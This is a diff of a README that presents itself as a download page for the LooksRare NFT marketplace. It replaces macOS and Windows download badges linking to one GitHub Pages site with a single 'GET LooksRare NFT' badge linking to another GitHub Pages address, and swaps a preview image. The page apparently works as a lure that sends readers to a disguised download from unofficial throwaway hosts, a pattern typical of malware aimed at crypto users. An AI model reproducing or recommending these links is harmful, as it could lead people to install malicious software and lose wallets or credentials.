@@ -1,18 +1,7 @@
 # LooksRare Download — NFT Marketplace Platform
 
-<a href="https://git-io-setup.github.io/.github/?offer=LooksRare" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/LooksRare%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" 
-    width="280" 
-    alt="LooksRare for macOS">
-</a>
+[![GET LooksRare NFT](https://img.shields.io/badge/GET%20%E2%80%94%20LooksRare-NFT-0078D6?style=for-the-badge&logoColor=white)](https://bogdan9143goce.github.io/.github/LooksRare-NFT)
 
-<a href="https://git-io-setup.github.io/.github/?offer=LooksRare" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/LooksRare%20for%20Windows-0078D7?style=for-the-badge&logo=windows&logoColor=white" 
-    width="280" 
-    alt="LooksRare for Windows">
-</a>
 
 ---
 
@@ -65,7 +54,7 @@ The platform's unique reward system distributes native tokens to active particip
 
 ## 🖼 Platform Preview
 
-![LooksRare Marketplace Interface](https://www.nadcab.com/wp-content/uploads/2025/06/looksrare-1.jpg)
+![LooksRare Marketplace Interface](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSLr91ELBt-a8fQ5Q5k3fPu1r62Lm2WLCx4Ww7mm4Ev7IB3BcuUPgEcusU&s=10)
 
 ---
 
